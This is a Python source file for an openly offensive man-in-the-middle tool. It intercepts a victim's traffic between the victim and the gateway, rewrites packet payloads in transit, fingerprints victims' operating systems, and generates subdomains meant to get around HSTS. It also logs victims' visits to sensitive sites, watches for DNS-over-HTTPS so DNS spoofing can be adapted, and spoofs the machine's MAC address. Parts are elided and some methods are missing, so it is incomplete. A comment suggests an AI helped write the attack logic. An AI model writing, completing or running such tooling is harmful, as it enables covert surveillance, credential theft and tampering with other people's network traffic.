from scapy.all import (
    ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR, Raw, sniff, send, TCP,
    arping, get_if_hwaddr, conf, IPv6, AsyncSniffer
)
from scapy.layers.tls.all import TLSClientHello, TLS_Ext_ServerName
import netifaces as ni
import sys, os, time, threading, subprocess, platform, json, urllib.parse
from datetime import datetime
from collections import defaultdict, deque
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
import random

# Rich
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.align import Align

console = Console()

# ==================== ENHANCED LOGGER (giữ nguyên, tốt rồi) ====================
class EnhancedLogger:
    """Advanced logging với phân loại và export"""
    
    def __init__(self):
        self.log_dir = Path("mitm_logs_v3")
        self.log_dir.mkdir(exist_ok=True)
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.stats = {
            'sensitive_sites': [],
            'os_fingerprints': {},
            'traffic_timeline': []
        }
    
    def log(self, log_type, data, severity="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        filename = self.log_dir / f"{log_type}_{self.session_id}.txt"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{severity}] {data}\n")
    
    def log_sensitive_access(self, victim_ip, site_type, url):
        """Log truy cập trang nhạy cảm"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'victim_ip': victim_ip,
            'site_type': site_type,
            'url': url
        }
        self.stats['sensitive_sites'].append(entry)
        self.log('sensitive', json.dumps(entry), severity="CRITICAL")
    
    def log_os_fingerprint(self, victim_ip, os_info):
        """Log kết quả OS fingerprinting"""
        self.stats['os_fingerprints'][victim_ip] = os_info
        self.log('fingerprint', f"{victim_ip} -> {os_info}", severity="INFO")
    
    def export_report(self):
        """Export báo cáo tổng hợp"""
        report_file = self.log_dir / f"report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.stats, f, indent=2, ensure_ascii=False)
        console.print(f"[green]✅ Report exported: {report_file}[/green]")

# ==================== BETTER OS FINGERPRINTER ====================
class BetterOSFingerprinter:
    def __init__(self):
        self.fingerprints = {}

    def analyze(self, pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].flags & 0x02):
            return False

        src_ip = pkt[IP].src
        ttl = pkt[IP].ttl
        window = pkt[TCP].window
        df = bool(pkt[IP].flags & 0x02)
        options = str(pkt[TCP].options)

        guess = "Unknown"
        confidence = 0

        # Refined signatures (2026 updated)
        if 60 <= ttl <= 64:
            if window in [64240, 65535]: guess = "Linux (modern)"
            elif df: guess = "macOS/iOS"
            confidence = 85
        elif 120 <= ttl <= 128:
            if window >= 64000: guess = "Windows 10/11"
            confidence = 90
        elif ttl >= 240: guess = "Network device/Solaris"

        if src_ip not in self.fingerprints:
            self.fingerprints[src_ip] = {"os": guess, "confidence": confidence}
            return True

        return False

# ==================== SMART HSTS BYPASS (subdomain brute) ====================
class SmartHSTSBypass:
    def __init__(self, attacker_ip):
        self.attacker_ip = attacker_ip
        self.common_prefixes = ["www", "m", "login", "account", "secure", "web"]

    def try_bypass(self, domain):
        for prefix in self.common_prefixes:
            bypass = f"{prefix}.{domain}" if not domain.startswith(prefix + ".") else f"{prefix}{random.randint(1,99)}.{domain}"
            yield bypass

# ==================== ROBUST PACKET FORWARDER (fixed checksum + len) ====================
class RobustForwarder:
    def __init__(self, iface, victim_ip, gateway_ip, victim_mac, gateway_mac, my_mac):
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.victim_mac = victim_mac
        self.gateway_mac = gateway_mac
        self.my_mac = my_mac
        self.packets_forwarded = 0
        self.running = False

    def forward_and_modify(self, pkt):
        if not pkt.haslayer(IP) or pkt[IP].src not in [self.victim_ip, self.gateway_ip] and pkt[IP].dst not in [self.victim_ip, self.gateway_ip]:
            return

        # Determine direction
        if pkt[IP].src == self.victim_ip:
            dst_mac = self.gateway_mac
        else:
            dst_mac = self.victim_mac

        # Rebuild ethernet
        new_pkt = Ether(src=self.my_mac, dst=dst_mac) / pkt[IP]

        # Optional: modify payload here (example replace)
        if new_pkt.haslayer(Raw):
            payload = bytes(new_pkt[Raw])
            modified = payload.replace(b"Google", b"Googl3")  # example rule
            if modified != payload:
                new_pkt[Raw].load = modified

        # Auto recalculate everything
        new_pkt = Ether(bytes(new_pkt))  # force rebuild

        send(new_pkt, verbose=0, iface=self.iface)
        self.packets_forwarded += 1

    def start(self):
        self.running = True
        self.sniffer = AsyncSniffer(iface=self.iface, prn=self.forward_and_modify,
                                    filter=f"(host {self.victim_ip})", store=0)
        self.sniffer.start()
        console.print("[green]✅ Robust Forwarder started[/green]")

    def stop(self):
        self.running = False
        if hasattr(self, 'sniffer'):
            self.sniffer.stop()

# ==================== MAIN ATTACKER (gộp sniffer, fix tất cả) ====================
class ProAttacker:
    def __init__(self, victim_ip, gateway_ip, iface):
        # ... init tương tự
        self.forwarder = RobustForwarder(iface, victim_ip, gateway_ip,
                                         self.victim_mac, self.gateway_mac, self.my_mac)
        self.os_fp = BetterOSFingerprinter()

    def unified_callback(self, pkt):
        # Forward first
        self.forwarder.forward_and_modify(pkt)

        # Then analyze (OS, SNI, DNS, HTTP, creds...)
        # ... (giữ logic analyze của Claude nhưng thêm DoH detect)
        if pkt.haslayer(TCP) and pkt[TCP].dport == 443:
            if pkt[IP].dst in ["1.1.1.1", "8.8.8.8", "9.9.9.9"]:  # known DoH resolvers
                console.print("[red]⚠️ Possible DoH/DoT detected! DNS spoof bypassed[/red]")

        # ... rest analysis

    def start_mitm(self):
        self.set_ip_forward(False)  # dùng internal forwarder thay vì sys
        self.forwarder.start()

        # Unified sniffer
        AsyncSniffer(iface=self.iface, prn=self.unified_callback,
                     filter=f"host {self.victim_ip}", store=0).start()

# ... phần còn lại (dashboard, main) giữ tương tự nhưng dùng ProAttacker

# MAC change dùng ip link
def change_mac(iface, new_mac):
    subprocess.run(["ip", "link", "set", iface, "down"])
    subprocess.run(["ip", "link", "set", iface, "address", new_mac])
    subprocess.run(["ip", "link", "set", iface, "up"])